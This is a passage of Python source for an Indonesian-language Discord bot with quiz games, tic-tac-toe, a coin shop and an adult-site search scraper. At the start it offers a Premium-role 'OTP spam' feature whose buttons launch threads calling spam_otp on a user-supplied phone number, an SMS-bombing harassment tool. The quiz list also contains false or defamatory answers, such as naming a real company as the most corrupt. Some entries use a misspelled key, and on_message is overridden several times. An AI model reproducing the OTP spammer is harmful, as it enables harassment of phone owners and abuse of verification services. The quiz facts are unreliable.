# View Tombol Replay
class ReplayView(discord.ui.View):
    def __init__(self, phone, jumlah):
        super().__init__(timeout=60)
        self.phone = phone
        self.jumlah = jumlah

    @discord.ui.button(label="Replay Spam", style=discord.ButtonStyle.red)
    async def replay(self, interaction: discord.Interaction, button: discord.ui.Button):
        threading.Thread(target=spam_otp, args=(self.phone, self.jumlah)).start()
        await interaction.response.send_message(f"Ulangi spam ke **{self.phone}** sebanyak **{self.jumlah}x**", ephemeral=True)

    @discord.ui.button(label="Stop Spam", style=discord.ButtonStyle.blurple)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("⛔ Spam dihentikan manual (sebenernya cuma info doang hehe)", ephemeral=True)

    @discord.ui.button(label="Hapus Pesan", style=discord.ButtonStyle.grey)
    async def delete(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.message.author == interaction.client.user:
            await interaction.message.delete()
        else:
            await interaction.response.send_message("Cuma bisa hapus pesan dari bot yaa~", ephemeral=True)

# Tombol utama
class OTPView(discord.ui.View):
    @discord.ui.button(label="Mulai OTP Spam", style=discord.ButtonStyle.danger)
    async def send_otp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        role_names = [r.name for r in interaction.user.roles]
        if "Premium" not in role_names:
            await interaction.response.send_message("⛔ Fitur ini cuma buat yang punya role **Premium** yaa~", ephemeral=True)
            return

        await interaction.response.send_modal(OTPModal())
        
# Command untuk munculin tombol
@bot.command()
async def otp(ctx):
    await ctx.send("Klik tombol di bawah untuk kirim OTP:", view=OTPView())

        
#screah hentai
async def search_hentai(query):
    url = f"https://hentai.tv/?s={query}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            html = await response.text()
    soup = BeautifulSoup(html, 'html.parser')
    result = []

    for el in soup.select('div.flex > div.crsl-slde')[:5]:
        thumbnail = el.find('img')['src']
        title = el.find('a').text.strip()
        views = el.find('p').text.strip()
        video_url = el.find('a')['href']
        result.append({'thumbnail': thumbnail, 'title': title, 'views': views, 'url': video_url})

    return result

@bot.command()
async def searchhentai(ctx, *, query: str = None):
    if not query:
        return await ctx.send("Masukkan judul yang ingin dicari!\nContoh: `.searchhentai hinata`")

    # Cek role Premium (dengan kapitalisasi yang benar)
    user_roles = [role.name for role in ctx.author.roles]
    print(f"Roles pengguna: {user_roles}")  # Debugging: cek roles yang dimiliki
    if 'Premium' not in user_roles:
        return await ctx.send("Perintah ini hanya untuk pengguna dengan role **Premium**.")

    await ctx.send("Mencari, tunggu sebentar...")

    try:
        results = await search_hentai(query)
        if not results:
            return await ctx.send("Tidak ditemukan!")

        embed = discord.Embed(title="Hasil Pencarian dari Hentai.tv", color=discord.Color.red())
        for res in results:
            embed.add_field(name=res['title'], value=f"Views: {res['views']}\n[Link]({res['url']})", inline=False)
        embed.set_image(url=results[0]['thumbnail'])

        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Gagal mengambil data: {e}")
        
# Tebak Gambar
import discord
from discord.ext import commands
import asyncio
import aiohttp
import io

games = {}

async def ambil_data_game(jenis):
    try:
        res = requests.get(f'https://api.siputzx.my.id/api/games/{jenis}')
        return res.json()
    except:
        return None

async def ambil_gambar(img_url):
    async with aiohttp.ClientSession() as session:
        async with session.get(img_url) as response:
            return await response.read()

def simpan_game(channel_id, jawaban, msg, jenis):
    games[channel_id] = {
        "jawaban": jawaban,
        "waktu": asyncio.get_event_loop().time() + 60,
        "pesan": msg,
        "jenis": jenis
    }

async def countdown(ctx):
    await asyncio.sleep(60)
    game = games.get(ctx.channel.id)
    if game:
        jawaban = game["jawaban"]
        if isinstance(jawaban, list):
            jawaban = ' / '.join(jawaban)
        await ctx.send(f"**Waktu habis!** Jawabannya adalah: **{jawaban}**")
        del games[ctx.channel.id]

# ============
# Game Commands
# ============

@bot.command()
async def tebakgambar(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("tebakgambar")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["jawaban"].lower()
    img = json["data"]["img"]
    embed = discord.Embed(title="TEBAK GAMBAR", description="Waktu: 60 detik\nBalas dengan jawabanmu!", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    img_data = await ambil_gambar(img)
    await ctx.send(file=discord.File(io.BytesIO(img_data), filename="gambar.jpg"))
    simpan_game(ctx.channel.id, jawaban, msg, "tebakgambar")
    await countdown(ctx)

@bot.command()
async def tebaklogo(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("tebaklogo")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["data"]["jawaban"].lower()
    img = json["data"]["data"]["image"]
    embed = discord.Embed(title="TEBAK LOGO", description="Waktu: 60 detik\nBalas dengan jawabanmu!", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    img_data = await ambil_gambar(img)
    await ctx.send(file=discord.File(io.BytesIO(img_data), filename="logo.jpg"))
    simpan_game(ctx.channel.id, jawaban, msg, "tebaklogo")
    await countdown(ctx)

@bot.command()
async def tebakbendera(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("tebakbendera")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json.get("jawaban", "").lower()
    img = json.get("img") or json["data"].get("img")
    embed = discord.Embed(title="TEBAK BENDERA", description="Waktu: 60 detik\nBalas dengan jawabanmu!", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    img_data = await ambil_gambar(img)
    await ctx.send(file=discord.File(io.BytesIO(img_data), filename="bendera.jpg"))
    simpan_game(ctx.channel.id, jawaban, msg, "tebakbendera")
    await countdown(ctx)

@bot.command()
async def tebaksurah(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("surah")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    data = json["data"]
    jawaban = [
        data["surah"]["englishName"].lower(),
        data["surah"]["name"].lower()
    ]
    embed = discord.Embed(title="TEBAK SURAH", description=data["text"], color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    img_data = await ambil_gambar(data["audio"])
    await ctx.send(file=discord.File(io.BytesIO(img_data), filename="surah.mp4"))
    simpan_game(ctx.channel.id, jawaban, msg, "surah")
    await countdown(ctx)

@bot.command()
async def caklontong(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("caklontong")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["jawaban"].lower()
    soal = json["data"]["soal"]
    embed = discord.Embed(title="CAK LONTONG", description=soal + "\nWaktu: 60 detik", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    simpan_game(ctx.channel.id, jawaban, msg, "caklontong")
    await countdown(ctx)

@bot.command()
async def tebaklirik(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("tebaklirik")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["jawaban"].lower()
    soal = json["data"]["soal"]
    embed = discord.Embed(title="TEBAK LIRIK", description=soal + "\nWaktu: 60 detik", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    simpan_game(ctx.channel.id, jawaban, msg, "tebaklirik")
    await countdown(ctx)

@bot.command()
async def siapakahaku(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("siapakahaku")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["jawaban"].lower()
    soal = json["data"]["soal"]
    embed = discord.Embed(title="SIAPAKAH AKU?", description=soal + "\nWaktu: 60 detik", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    simpan_game(ctx.channel.id, jawaban, msg, "siapakahaku")
    await countdown(ctx)

@bot.command()
async def susunkata(ctx):
    if ctx.channel.id in games:
        await ctx.send("Masih ada game yang berjalan di channel ini!")
        return
    json = await ambil_data_game("susunkata")
    if not json:
        await ctx.send("Gagal mengambil data dari API.")
        return
    jawaban = json["data"]["jawaban"].lower()
    soal = json["data"]["soal"]
    tipe = json["data"].get("tipe", "-")
    embed = discord.Embed(title="SUSUN KATA", description=f"{soal}\nTipe: {tipe}\nWaktu: 60 detik", color=discord.Color.blue())
    msg = await ctx.send(embed=embed)
    simpan_game(ctx.channel.id, jawaban, msg, "susunkata")
    await countdown(ctx)

# Tambahkan command lain sesuai format di atas...
@bot.event
async def on_message(message):
    await bot.process_commands(message)  # tetap jalankan perintah lainnya
    if message.author.bot or message.channel.id not in games:
        return

    game = games[message.channel.id]
    jawaban = game["jawaban"]
    text = message.content.lower().strip()
    sisa = game["waktu"] - asyncio.get_event_loop().time()

    if text == "nyerah":
        real = jawaban if isinstance(jawaban, str) else ' / '.join(jawaban)
        await message.reply(f"yah nyerah yaa?\njawabannya itu **{real}** sayangg~~")
        del games[message.channel.id]
    elif text == "clue":
        clue = (jawaban[0] if isinstance(jawaban, list) else jawaban)
        clue = ''.join('_' if c in 'aiueo' else c for c in clue)
        await message.reply(f"clue: **{clue}**")
    elif sisa <= 0:
        real = jawaban if isinstance(jawaban, str) else ' / '.join(jawaban)
        await message.reply(f"**waktu habisss!** jawabannya itu **{real}** yaa sayangg~~")
        del games[message.channel.id]
    elif (text in jawaban if isinstance(jawaban, list) else text == jawaban):
        await message.reply(f"**benarr!** jawaban kamu itu **{text}** yaa hebatt sayangkuu~~")
        del games[message.channel.id]
    else:
        await message.reply("**jawaban kamu masih salah sayangg~~** coba lagi yaaa, ketik `clue` buat petunjukk atau `nyerah` kalau mau nyerahhh.")
     
# Global variables
current_sentence = None
correct_answer = None
time_limit = 60  # Waktu menjawab: 60 detik

# Soal susun kalimat langsung di dalam list
sentence_list = [
    "ibu masak ayam",
    "kucing makan ikan",
    "saya pergi sekolah",
    "dia bermain bola",
    "makan nasi goreng",
    "burung terbang tinggi",
    "adik tidur siang",
    "bapak baca koran",
    "saya belajar coding",
    "kita jalan ke pasar",
    "teman saya baik hati",
    "langit biru cerah sekali",
    "dia membaca buku cerita",
    "mobil merah melaju cepat",
    "guru mengajar di kelas",
    "rumah itu sangat besar",
    "anak kecil menangis keras",
    "pak tani menanam padi",
    "pohon mangga berbuah banyak",
    "ibu membeli sayur segar",
    "adik suka bermain boneka",
    "burung berkicau di pagi hari",
    "kakak memasak di dapur",
    "orang tua mendidik anak",
    "kita berlari di lapangan",
    "pesawat terbang di angkasa",
    "ikan berenang di kolam",
    "matahari bersinar sangat terang",
    "petani bekerja di sawah",
    "anjing menggonggong di malam hari",
    "paman membawa oleh oleh",
    "mereka bernyanyi di atas panggung",
    "nenek duduk di kursi goyang",
    "adik belajar membaca buku",
    "pak polisi mengatur lalu lintas",
    "ayah memperbaiki sepeda rusak",
    "toko itu menjual baju murah",
    "wanita cantik memakai gaun merah",
    "kami berkemah di tepi sungai",
    "anak laki laki bermain layangan",
    "pelangi muncul setelah hujan",
    "siswa belajar dengan giat",
    "kapal berlayar di laut lepas",
    "lampu kamar sudah dinyalakan",
    "kucing tidur di atas sofa",
    "bapak membawa koper besar",
    "dokter memeriksa pasien sakit",
    "ibu membuat kue ulang tahun"
]

@bot.command()
async def susunkalimat(ctx):
    global current_sentence, correct_answer

    current_sentence = random.choice(sentence_list)
    words = current_sentence.split(" ")
    random.shuffle(words)
    scrambled_sentence = " ".join(words)

    correct_answer = current_sentence.lower()

    embed = discord.Embed(
        title="🧩 Susun Kalimat!",
        description=f"🔀 *Kata Acak:* {scrambled_sentence}\n⏳ *Waktu:* 1 menit!\n💡 *Petunjuk:* Susun kata-kata di atas menjadi kalimat yang benar!\n\n📝 *Ketik:* `/jawabsusunkalimat [kalimat kamu]`",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

    await asyncio.sleep(time_limit)

    if current_sentence:
        await ctx.send(f"⏰ *Waktu habis!* ❌ Jawaban yang benar adalah: *{current_sentence}*")
        current_sentence = None

@bot.command()
async def jawabsusunkalimat(ctx, *, user_answer: str):
    global current_sentence, correct_answer

    if not current_sentence:
        await ctx.send("⚠️ Tidak ada soal aktif! Ketik `/susunkalimat` dulu!")
        return

    if user_answer.strip().lower() == correct_answer:
        embed = discord.Embed(
            title="✅ Benar!",
            description="Kamu berhasil menyusun kalimat dengan benar! 🎉",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        current_sentence = None
    else:
        words = current_sentence.split(" ")
        random.shuffle(words)
        scrambled_clue = " ".join(words)
        embed = discord.Embed(
            title="❌ Jawaban Salah!",
            description=f"😅 Coba lagi ya sayangg~\n\n💡 *Clue acak:* {scrambled_clue}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

#kuis
bot.kuisAktif = False
bot.kuisJawaban = ""

# Data soal langsung di dalam kode
soalList = [
    {
        "soal": "Apa ibu kota Indonesia?",
        "jawaban": "Jakarta"
    },
    {
        "soal": "Siapa presiden pertama Indonesia?",
        "jawaban": "Soekarno"
    },
    {
        "soal": "Berapa hasil dari 7 + 8?",
        "jawaban": "15"
    },
    {
        "soal": "Siapa penemu telepon?",
        "jawaban": "Alexander Graham Bell"
    },
    {
        "soal": "Apa nama planet yang terdekat dengan matahari?",
        "jawaban": "Merkurius"
    },
    {
        "soal": "Berapa jumlah provinsi di Indonesia?",
        "jawaban": "34"
    },
    {
        "soal": "Siapa penulis buku Harry Potter?",
        "jawaban": "J.K. Rowling"
    },
    {
        "soal": "Siapa yang menciptakan teori relativitas?",
        "jawaban": "Albert Einstein"
    },
    {
        "soal": "Apa nama gunung tertinggi di dunia?",
        "jawaban": "Gunung Everest"
    },
    {
        "soal": "Berapa lama satu tahun di Bumi?",
        "jawaban": "365 hari"
    },
    {
        "soal": "Apa ibu kota Jepang?",
        "jawaban": "Tokyo"
    },
    {
        "soal": "Siapa penemu listrik?",
        "jawaban": "Benjamin Franklin"
    },
    {
        "soal": "Apa nama laut yang mengelilingi Indonesia?",
        "jawaban": "Laut Indonesia"
    },
    {
        "soal": "Berapa jumlah pulau di Indonesia?",
        "jawaban": "17.508"
    },
    {
        "soal": "Siapa pelukis Mona Lisa?",
        "jawaban": "Leonardo da Vinci"
    },
    {
        "soal": "Apa nama sungai terpanjang di dunia?",
        "jawaban": "Sungai Nil"
    },
    {
        "soal": "Siapa yang pertama kali menginjakkan kaki di bulan?",
        "jawaban": "Neil Armstrong"
    },
    {
        "soal": "Apa nama ibu kota Amerika Serikat?",
        "jawaban": "Washington D.C."
    },
    {
        "soal": "Apa nama negara dengan penduduk terbanyak di dunia?",
        "jawaban": "China"
    },
    {
        "soal": "Siapa penemu bola lampu?",
        "jawaban": "Thomas Edison"
    },
    {
        "soal": "Siapa yang menemukan hukum gravitasi?",
        "jawaban": "Isaac Newton"
    },
    {
        "soal": "Apa nama pulau terbesar di Indonesia?",
        "jawaban": "Borneo"
    },
    {
        "soal": "Siapa tokoh utama dalam film Titanic?",
        "jawaban": "Leonardo DiCaprio"
    },
    {
        "soal": "Apa nama negara yang memiliki piramida terkenal?",
        "jawabam": "Mesir"
    },
    {
        "soal": "Siapa presiden Amerika Serikat yang pertama?",
        "jawaban": "George Washington"
    },
    {
        "soal": "Apa nama tim sepak bola terbesar di Inggris?",
        "jawabam": "Manchester United"
    },
    {
        "soal": "Apa ibu kota Prancis?",
        "jawaban": "Paris"
    },
    {
        "soal": "Siapa yang menemukan teori evolusi?",
        "jawaban": "Charles Darwin"
    },
    {
        "soal": "Apa nama pulau di Indonesia yang paling banyak di kunjungi oleh wisatawan?",
        "jawaban": "Bali"
    },
    {
        "soal": "Siapa yang menciptakan Windows?",
        "jawabam": "Bill Gates"
    },
    {
        "soal": "Apa nama ibukota India?",
        "jawaban": "New Delhi"
    },
    {
        "soal": "Berapa panjang sungai Amazon?",
        "jawaban": "6.400 km"
    },
    {
        "soal": "Siapa yang menulis The Hobbit?",
        "jawaban": "J.R.R. Tolkien"
    },
    {
        "soal": "Siapa penemu pesawat terbang?",
        "jawaban": "Wright bersaudara"
    },
    {
        "soal": "Berapa hasil dari 1+1×0?",
        "jawaban": "1"
    },
    {
        "soal": "HTML digunakan dalam sebuah website sebagai apa?",
        "jawaban": "Frontend"
    },
    {
        "soal": "Arti gpp dalam kamu cewe arti nya adalah",
        "jawaban": "Badmood"
    },
    {
        "soal": "Domain website bisa kita gunakan kalo kita sudah",
        "jawaban": "Membeli"
    },
    {
        "soal": "Pertanyaan jebakan !, 1+1 berapa hasil nya?",
        "jawaban": "100"
    },
    {
        "soal": "Perusahaan paling berkorupsi di indonesia adalah",
        "jawaban": "PT Antam"
    },
    {
        "soal": "Aplikasi media sosial paling terpopuler adalah?",
        "jawaban": "WhatSapp"
    },
    {
      "soal": "Kapan proklamasi kemerdekaan indonesia dibacakan",
      "jawaban": "17 Agustus 1945"
    },
    {
      "soal": "Kapan perang dunia ke II berakhir",
      "jawaban": "1945"
    },
    {
      "soal": "Siapa yang menjadi gubernur jendral hindia belanda terakhir",
      "jawaban": "H.J. Van Mook"
    }
]

@bot.command()
async def kuis(ctx):
    if bot.kuisAktif:
        await ctx.reply("⚠️ Kuis sedang berlangsung, silakan jawab pertanyaan yang ada!")
        return

    soalAcak = random.choice(soalList)
    bot.kuisJawaban = soalAcak['jawaban'].lower()
    bot.kuisAktif = True

    kuisEmbed = discord.Embed(
        title='🧠 KUIS BERHADIAH!',
        description=f"❓ *Pertanyaan:* {soalAcak['soal']}\n\n⏳ *Waktu menjawab: 40 detik*\n💡 *Jawaban? Ketik:* /jawab [jawaban kamu]",
        color=0x0099ff
    )
    kuisEmbed.set_footer(text='Ketik /kuis untuk pertanyaan berikutnya setelah kuis selesai.')

    await ctx.reply(embed=kuisEmbed)

    await asyncio.sleep(40)
    if bot.kuisAktif:
        bot.kuisAktif = False
        await ctx.reply("⏰ Waktu habis! Tidak ada yang berhasil menjawab. Ketik `/kuis` untuk pertanyaan berikutnya.")

@bot.command()
async def jawab(ctx, *, qtext: str):
    if not bot.kuisAktif:
        await ctx.reply("⚠️ Belum ada kuis! Ketik `/kuis` dulu!")
        return

    jawabanUser = qtext.lower().strip()

    if jawabanUser == bot.kuisJawaban:
        bot.kuisAktif = False

        benarEmbed = discord.Embed(
            title='🎉 Selamat! Jawaban kamu benar! 🏆',
            description=f"🔥 *Selamat {ctx.author.name}! Jawaban kamu benar!*\n\nKetik `/kuis` untuk pertanyaan berikutnya.",
            color=0x28a745
        )
        await ctx.reply(embed=benarEmbed)
    else:
        salahEmbed = discord.Embed(
            title='❌ Salah! Coba lagi!',
            description=f"💡 *Clue:* Jawaban terdiri dari {len(bot.kuisJawaban)} huruf",
            color=0xdc3545
        )
        await ctx.reply(embed=salahEmbed)

#tebak bom    
solo_game = {}

emoji_map = {
    1: "1️⃣", 2: "2️⃣", 3: "3️⃣",
    4: "4️⃣", 5: "5️⃣", 6: "6️⃣",
    7: "7️⃣", 8: "8️⃣", 9: "9️⃣"
}

def format_board(picked, bomb=None):
    board = []
    for i in range(1, 10):
        if i == bomb:
            board.append("💥")
        elif i in picked:
            board.append("✅")
        else:
            board.append(emoji_map[i])
    return "\n".join([
        "".join(board[i:i+3])
        for i in range(0, 9, 3)
    ])

@bot.command()
async def tebakbom(ctx):
    user_id = ctx.author.id
    if user_id in solo_game:
        return await ctx.reply("Kamu masih main tuhh! Lanjutinn dulu yaaa~")

    bomb_pos = random.randint(1, 9)
    solo_game[user_id] = {
        "bomb": bomb_pos,
        "picked": [],
        "msg": None
    }

    embed = discord.Embed(
        title="💣 Tebak BOM (Solo)",
        description="Balas pesan ini dengan angka 1-9 buat pilih kotak!\nJangan sampe kena bom yaaa~",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Papan", value=format_board([]), inline=False)
    embed.set_footer(text="Balas pesan ini dengan angka (contoh: 5)")

    msg = await ctx.reply(embed=embed)
    solo_game[user_id]["msg"] = msg

@bot.event
async def on_message(message):
    await bot.process_commands(message)

    if message.author.bot or not message.reference:
        return

    user_id = message.author.id
    game = solo_game.get(user_id)

    if not game or not message.reference:
        return

    if message.reference.message_id != game["msg"].id:
        return

    try:
        angka = int(message.content.strip())
    except:
        return

    if angka < 1 or angka > 9:
        return await message.reply("Pilih angka dari 1 sampai 9 yaa!")

    if angka in game["picked"]:
        return await message.reply("Itu udah dipilih tadiii~ pilih yang lain yaaa~")

    if angka == game["bomb"]:
        new_board = format_board(game["picked"], bomb=angka)
        embed = discord.Embed(
            title="💥 BOOM!!",
            description=f"Kamu pilih {emoji_map[angka]} dan KENA BOM!!",
            color=discord.Color.red()
        )
        embed.add_field(name="Papan", value=new_board, inline=False)
        embed.set_footer(text="Main lagi? Ketik /bomb")
        await game["msg"].edit(embed=embed)
        await message.reply("KABOOMM!! Kamu kalah sayangg~")
        del solo_game[user_id]
    else:
        game["picked"].append(angka)
        new_board = format_board(game["picked"])
        embed = discord.Embed(
            title="✅ Aman!",
            description=f"Kamu pilih {emoji_map[angka]}, masih aman!",
            color=discord.Color.green()
        )
        embed.add_field(name="Papan", value=new_board, inline=False)
        embed.set_footer(text="Lanjut balas dengan angka lain~")
        await game["msg"].edit(embed=embed)

        if len(game["picked"]) == 8:
            await message.reply("KAMU MENANGG!! Semua aman kecuali si bom~")
            del solo_game[user_id]
        else:
            await message.reply("Lanjut pilih yang lain yaa~")

#tictac            
tictactoe_game = {}

def format_ttt(board):
    return "\n".join([
        "".join(board[i:i+3])
        for i in range(0, 9, 3)
    ])

def check_win(board, symbol):
    wins = [
        [0, 1, 2], [3, 4, 5], [6, 7, 8],  # Rows
        [0, 3, 6], [1, 4, 7], [2, 5, 8],  # Cols
        [0, 4, 8], [2, 4, 6]              # Diags
    ]
    return any(all(board[pos] == symbol for pos in line) for line in wins)

def get_ai_move(board):
    # 1. Menang kalau bisa
    for i in range(9):
        if board[i] not in ['⭕', '❌']:
            temp = board.copy()
            temp[i] = '❌'
            if check_win(temp, '❌'):
                return i

    # 2. Cegah lawan menang
    for i in range(9):
        if board[i] not in ['⭕', '❌']:
            temp = board.copy()
            temp[i] = '⭕'
            if check_win(temp, '⭕'):
                return i

    # 3. Ambil tengah kalau kosong
    if board[4] not in ['⭕', '❌']:
        return 4

    # 4. Pilih acak dari yang kosong
    empty = [i for i, cell in enumerate(board) if cell not in ['⭕', '❌']]
    return random.choice(empty)

@bot.command()
async def tictactoe(ctx):
    user_id = ctx.author.id
    if user_id in tictactoe_game:
        return await ctx.reply("Kamu masih main tuh sayangg~ balas dulu yaa!")

    board = [f"{i+1}\u20e3" for i in range(9)]  # 1️⃣ - 9️⃣
    tictactoe_game[user_id] = {
        "board": board,
        "msg": None,
        "turn": "player"
    }

    embed = discord.Embed(
        title="⭕ Tic Tac Toe ❌",
        description="Balas dengan angka (1-9) buat isi kotak kamu (⭕)",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Papan", value=format_ttt(board), inline=False)
    embed.set_footer(text="Kamu jalan dulu yaa~ balas pesan ini (contoh: 5)")

    msg = await ctx.reply(embed=embed)
    tictactoe_game[user_id]["msg"] = msg

@bot.event
async def on_message(message):
    await bot.process_commands(message)

    if message.author.bot or not message.reference:
        return

    user_id = message.author.id
    game = tictactoe_game.get(user_id)

    if not game or message.reference.message_id != game["msg"].id:
        return

    if game["turn"] != "player":
        return await message.reply("Tunggu giliran kamu yaaa~")

    try:
        move = int(message.content.strip()) - 1
    except:
        return

    board = game["board"]
    if move < 0 or move > 8 or board[move] in ['⭕', '❌']:
        return await message.reply("Pilihan ga valid sayangg~ coba angka lain~")

    board[move] = '⭕'

    if check_win(board, '⭕'):
        embed = discord.Embed(
            title="⭕ KAMU MENANGG!!",
            description="Kamu ngalahin si bot dengan cantik yaa~",
            color=discord.Color.green()
        )
        embed.add_field(name="Papan", value=format_ttt(board), inline=False)
        await game["msg"].edit(embed=embed)
        del tictactoe_game[user_id]
        return await message.reply("GG bangeetttt sayanggg!!")

    if all(cell in ['⭕', '❌'] for cell in board):
        embed = discord.Embed(
            title="⚖️ SERI!",
            description="Kalian sama kuatnyaa~",
            color=discord.Color.gold()
        )
        embed.add_field(name="Papan", value=format_ttt(board), inline=False)
        await game["msg"].edit(embed=embed)
        del tictactoe_game[user_id]
        return await message.reply("Kalian imbang sayang~")

    # BOT TURN
    game["turn"] = "bot"
    bot_move = get_ai_move(board)
    board[bot_move] = '❌'

    if check_win(board, '❌'):
        embed = discord.Embed(
            title="❌ BOT MENANG!!",
            description="Duhh kamu kalah sayangg~ coba lagi yuk!",
            color=discord.Color.red()
        )
        embed.add_field(name="Papan", value=format_ttt(board), inline=False)
        await game["msg"].edit(embed=embed)
        del tictactoe_game[user_id]
        return await message.reply("Jangan nyerah yaaa sayangggg!")

    if all(cell in ['⭕', '❌'] for cell in board):
        embed = discord.Embed(
            title="⚖️ SERI!",
            description="Kalian sama kuatnyaa~",
            color=discord.Color.gold()
        )
        embed.add_field(name="Papan", value=format_ttt(board), inline=False)
        await game["msg"].edit(embed=embed)
        del tictactoe_game[user_id]
        return await message.reply("Kalian imbang sayang~")

    game["turn"] = "player"
    embed = discord.Embed(
        title="⭕ Tic Tac Toe ❌",
        description="Sekarang giliran kamu yaaa~",
        color=discord.Color.blurple()
    )
    embed.add_field(name="Papan", value=format_ttt(board), inline=False)
    embed.set_footer(text="Balas dengan angka (1-9)")
    await game["msg"].edit(embed=embed)
    await message.reply("Giliran kamuu lagii sayanggg~")

#sistem by one
players = {}

# Daftar item yang tersedia di toko
shop_items = {
    "Pedang": {"price": 30, "description": "Meningkatkan skor per kemenangan! (+2 skor)", "effect": "score_boost", "value": 2},
    "Armor": {"price": 50, "description": "Meningkatkan ketahananmu, mengurangi skor kalah (-1 skor saat kalah)", "effect": "defense", "value": -1},
    "Double Up": {"price": 10, "description": "Tebak angka 1v1 dan dapatkan 2x koin!", "effect": "double_up", "value": 2},
    "Lucky Ticket": {"price": 20, "description": "Dapatkan kesempatan untuk memenangkan koin lebih banyak!", "effect": "lucky_ticket", "value": 5}
}

@bot.event
async def on_ready():
    print(f"Bot nyala sebagai {bot.user}")

def get_player(ctx):
    """Mendapatkan data pemain, jika belum ada maka buat baru."""
    if ctx.author not in players:
        players[ctx.author] = {"coins": 0, "score": 0, "items": []}
    return players[ctx.author]

@bot.command()
async def mulaii(ctx):
    """Memulai permainan 1v1 dengan bot. Jika tidak ada pemain dalam 10 detik, bot akan bermain."""
    await ctx.send("Tebak angka antara 1 hingga 10 untuk bermain! Jika kamu siap, jawab dengan angka.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    # Tunggu input dari pemain selama 10 detik
    try:
        msg = await bot.wait_for('message', check=check, timeout=10)  # 10 detik untuk merespons
        guess = int(msg.content)

        # Ambil data pemain
        player = get_player(ctx)

        embed = discord.Embed(title="Hasil Permainan", color=discord.Color.green())
        embed.add_field(name="Tebakan Kamu", value=str(guess), inline=False)

        number = random.randint(1, 10)  # Pilih angka acak untuk tebakan

        # Cek jika pemain memiliki pedang
        if "Pedang" in player["items"]:
            player["score"] += 2  # Tambah skor jika punya pedang

        # Cek jika pemain memiliki armor
        if "Armor" in player["items"]:
            player["score"] += -1  # Kurangi skor jika punya armor dan kalah

        if guess == number:
            embed.add_field(name="Status", value="Selamat! Kamu benar!", inline=False)
            player["score"] += 1
            player["coins"] += 5  # Menambahkan koin setelah menang
        else:
            embed.add_field(name="Status", value=f"Sayang sekali, tebakanmu salah! Angka yang benar adalah {number}.", inline=False)

        # Menampilkan skor dan koin
        embed.add_field(name="Skor Kamu", value=str(player["score"]), inline=False)
        embed.add_field(name="Koin Kamu", value=str(player["coins"]), inline=False)
        await ctx.send(embed=embed)

    except asyncio.TimeoutError:
        # Jika tidak ada input dalam 10 detik, bot akan bermain menggantikan pemain
        await ctx.send("Waktu habis! Bot akan bermain menggantikan kamu.")
        number = random.randint(1, 10)
        bot_guess = random.randint(1, 10)

        embed = discord.Embed(title="Hasil Permainan", color=discord.Color.red())
        embed.add_field(name="Tebakan Bot", value=str(bot_guess), inline=False)

        if bot_guess == number:
            embed.add_field(name="Status", value="Bot menang! Angka yang benar adalah {number}.", inline=False)
        else:
            embed.add_field(name="Status", value=f"Bot salah! Angka yang benar adalah {number}.", inline=False)

        # Menampilkan skor dan koin
        embed.add_field(name="Skor Bot", value="0", inline=False)
        embed.add_field(name="Koin Bot", value="0", inline=False)
        await ctx.send(embed=embed)

@bot.command()
async def score(ctx):
    """Menampilkan skor dan koin pemain."""
    player = get_player(ctx)
    embed = discord.Embed(title="Skor dan Koin Pemain", color=discord.Color.blue())
    embed.add_field(name="Skor Kamu", value=str(player["score"]), inline=False)
    embed.add_field(name="Koin Kamu", value=str(player["coins"]), inline=False)
    embed.add_field(name="Item yang Dimiliki", value=", ".join(player["items"]) if player["items"] else "Tidak ada item", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def resett(ctx):
    """Mereset skor dan koin pemain."""
    player = get_player(ctx)
    player["score"] = 0
    player["coins"] = 0
    player["items"] = []
    embed = discord.Embed(title="Data Reset", color=discord.Color.yellow())
    embed.add_field(name="Status", value="Skor, koin, dan item kamu telah direset.", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def shop(ctx):
    """Menampilkan daftar item yang tersedia di toko."""
    embed = discord.Embed(title="Toko", description="Pilih item yang ingin dibeli!", color=discord.Color.green())

    for item, data in shop_items.items():
        embed.add_field(
            name=item,
            value=f"**Harga**: {data['price']} koin\n{data['description']}",
            inline=False
        )
    await ctx.send(embed=embed)

@bot.command()
